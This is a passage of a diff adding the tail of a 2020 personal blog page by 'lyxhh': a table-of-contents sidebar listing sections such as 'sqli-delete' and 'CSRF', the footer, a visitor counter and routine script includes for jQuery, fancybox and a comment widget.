nav-level-4"><a class="nav-link" href="#1-3"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">2</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqli-delete"><span class="nav-number">1.2.3.</span> <span class="nav-text">sqli-delete</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-4"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-4"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">2</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF"><span class="nav-number">1.2.4.</span> <span class="nav-text">CSRF</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lyxhh</span>
+
+  
+</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
